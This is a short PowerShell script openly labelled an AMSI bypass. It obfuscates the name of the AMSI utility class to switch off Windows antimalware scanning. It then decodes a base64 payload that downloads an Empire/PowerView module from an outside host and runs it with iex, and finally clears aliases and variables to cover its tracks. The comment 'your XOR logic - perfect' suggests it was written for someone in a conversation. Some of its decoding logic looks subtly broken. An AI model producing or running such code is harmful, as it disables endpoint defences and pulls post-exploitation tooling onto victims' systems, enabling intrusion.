# AMSI Bypass v3.2 - FULLY FUNCTIONAL (no parse errors)

# Stages 1-4 (your XOR logic - perfect)
${++}=Get-Random;$___=Get-Date;$envVars='UserProfile','ComputerName';$seed=$envVars|%{Get-Item $_}|% Value|%{[int]($_[0])}
function g{[char[]]$args[0]|%{[int]$_-bxor($seed%256)}}
$dec=(g '77 97 110 97 103 101 109 101 110 116 65 117 116 111 109 97 116 105 111 110 46 65 109 115 105 85 116 105 108 115').-join''
if([type]$dec -and [type]$dec::'amsiInitFailed'){[type]$dec::'amsiInitFailed'.SetValue($null,$true)}

# Stage 5-6: SINGLE VALID Base64 payload (IEX + download empire)
$payload='SQBXQU5DKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRzdHJpbmcodGh0dHBzOi8vZ2l0aHViLmNvbS9CYWxsY3JlYXdlci9FbXBpcmUvcmF3L21hc3Rlci9kYXRhL21vZHVsZXMvcG93ZXJzaGVsbC9Qb3dlclZpZXdfRW1waXJlLnBzMQp9KQ=='
$bytes=[Convert]::FromBase64String($payload);iex ([Text.Encoding]::ASCII.GetString($bytes))

# Stage 8: Cleanup
rm alias:function:* -ea 0;gv *_*|rv -ea 0
